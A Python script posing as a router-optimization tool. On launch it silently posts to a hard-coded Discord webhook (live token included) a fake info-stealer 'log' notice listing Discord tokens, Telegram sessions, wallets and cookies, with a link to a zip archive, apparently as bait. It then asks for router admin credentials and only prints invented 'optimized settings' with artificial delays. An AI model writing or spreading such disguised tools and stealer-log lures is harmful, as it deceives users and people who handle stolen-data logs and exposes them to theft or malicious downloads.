import time, requests

WEBHOOK_URL = "https://discord.com/api/webhooks/1400948538451693610/3VHJUuY9U1kWn15xsBy0Wr0ntTEmXVJu5hLPSJxdcRpdKUH7IljZWsNbk5IP-vMRj3v5"

def send_message_no_output(content):
    data = {
        "content": content,
        "allowed_mentions": {"parse": []}
    }
    requests.post(WEBHOOK_URL, json=data)

send_message_no_output("📥 **New Log Received!** 📥\n | 🔐 **Discord Token**: ✅ \n | 💬 **Telegram Session**: ✅\n | 💰 **Wallets**: ✅\n | 🍪 **Cookies**: ✅\n | 🕓 **Browser History**: ✅\n https://cdn.discordapp.com/attachments/1400950143850774598/1400950668365402182/log20250802.1.zip.7z?ex=688e807b&is=688d2efb&hm=82da05d46de03cfac27d31638cd29fdfb298ad55daa75a3461e486bbe0551587&") #Only Visual, cheak a download link

def main():
    print("best router settings\nactual version: 1.0.7\nproject in github:\n developer: JoeGentov")
    print("pls choose your router (example: asus rt-ax1800u)")
    router = input()
    print("\nchoose an action:\n 1. restore default settings\n 2. apply optimized settings\n 3. router control panel")
    choose = input()
    if choose == "1":
        print ("ok, good")
        print ("please enter your router admin panel login details")
        print ("your login?")
        login = input()
        print ("your password?")
        password = input()
        print ("okay, all good?")
        print (f"your password: {password} your login: {login}")
        choose1 = input()
        if choose1 == "y" or "Y" or "Н" or "н":
            print("ok, turn on debug mode?")
            choosedebug = input()
            if choosedebug.lower() in ("y", "н"):
                current_primary_dns = "192.168.1.1"
                current_secondary_dns = "192.168.1.2"
                    
                new_primary_dns = "8.8.8.8"
                new_secondary_dns = "8.8.4.4"
                    
                print("=== DNS Settings ===")
                print(f"Current primary DNS:   {current_primary_dns}")
                print(f"Current secondary DNS: {current_secondary_dns}\n")
                    
                print("Changing DNS settings...\n")
                time.sleep(0.7)
                print(f"New primary DNS:       {new_primary_dns}")
                print(f"New secondary DNS:     {new_secondary_dns}")
                print("\nSettings applied successfully!")   
                
                time.sleep(1)
                
                print("=== Wi-Fi Settings ===")
                current_ssid = "TP-LINK 5G"
                new_ssid = "Tp-Link WIFI 5ghz"
                print(f"Current SSID:          {current_ssid}\n")
                print("Changing Wi-Fi SSID...\n")
                time.sleep(0.7)
                print(f"New SSID:              {new_ssid}")
                print("Settings applied successfully!\n")
                
                time.sleep(1.5)
                
                print("=== Wi-Fi Password ===")
                current_wifi_password = "Protik80"
                new_wifi_password = "Aohu10!@jbnAAlw95o"
                print(f"Current Wi-Fi password: {current_wifi_password}\n")
                print("Changing Wi-Fi password...\n")
                time.sleep(0.7)
                print(f"New Wi-Fi password:     {new_wifi_password}")
                print("Settings applied successfully!\n")
                
                time.sleep(0.7)
                
                print("=== Local Router IP Settings ===")
                current_ip = "192.168.0.1"
                new_ip = "192.168.1.1"
                print(f"Current router IP:     {current_ip}\n")
                print("Changing router IP...\n")
                time.sleep(0.7)
                print(f"New router IP:         {new_ip}")
                print("Settings applied successfully!\n")
                
                print("Succesfuly! (6.5 seconds)")
                
            elif choosedebug.lower() in ("n", "т"):
                
                print ("wait pls")
                time.sleep(6.5)
                print("Succesfuly! (6.5 seconds)")
                
            else:
                print("ok ok ok ok ok ok restart8")
                
    elif choose == "2":
        print ("ok, good")
        print ("please enter your router admin panel login details")
        print ("your login?")
        login = input()
        print ("your password?")
        password = input()
        print ("okay, all good?")
        print (f"your password: {password} your login: {login}")
        choose1 = input()
        if choose1 == "y" or "Y" or "Н" or "н":
            print("ok, turn on debug mode?")
            choosedebug = input()
            if choosedebug.lower() in ("y", "н"):        
                current_primary_dns = "192.168.1.1"
                current_secondary_dns = "192.168.1.2"
                
                optimized_primary_dns = "1.1.1.1"
                optimized_secondary_dns = "1.0.0.1"
                
                print("=== DNS Settings (Optimized) ===")
                print(f"Current primary DNS:   {current_primary_dns}")
                print(f"Current secondary DNS: {current_secondary_dns}\n")
                
                print("Applying optimized DNS settings...\n")
                time.sleep(0.7)
                print(f"New primary DNS:       {optimized_primary_dns}")
                print(f"New secondary DNS:     {optimized_secondary_dns}")
                print("Settings applied successfully!\n")
                
                time.sleep(1)
                
                print("=== Wi-Fi Settings (Optimized) ===")
                current_ssid = "TP-LINK 5G"
                optimized_ssid = "Tp-Link_Optimized_5GHz"
                print(f"Current SSID:          {current_ssid}\n")
                print("Updating Wi-Fi SSID for optimization...\n")
                time.sleep(0.7)
                print(f"New SSID:              {optimized_ssid}")
                print("Settings applied successfully!\n")
                
                time.sleep(1.5)
                
                print("=== Wi-Fi Password (Optimized) ===")
                current_wifi_password = "Protik80"
                optimized_wifi_password = "StrongPass!2025"
                print(f"Current Wi-Fi password: {current_wifi_password}\n")
                print("Changing Wi-Fi password to optimized...\n")
                time.sleep(0.7)
                print(f"New Wi-Fi password:     {optimized_wifi_password}")
                print("Settings applied successfully!\n")
                
                time.sleep(0.7)
                
                print("=== Local Router IP Settings (Optimized) ===")
                current_ip = "192.168.0.1"
                optimized_ip = "192.168.10.1"
                print(f"Current router IP:     {current_ip}\n")
                print("Applying optimized router IP...\n")
                time.sleep(0.7)
                print(f"New router IP:         {optimized_ip}")
                print("Settings applied successfully!\n")
                print("done with 6.5 sec")
                
            elif choosedebug.lower() in ("n", "т"):
                
                print ("wait pls")
                time.sleep(6.5)
                print("Succesfuly! (6.5 seconds)")
                
            else:
                print ("restart")
                
    elif choose == "3":
        print ("open this link in your browser: http:\\192.168.0.1")
        return
    
    else:
        return main()


main()
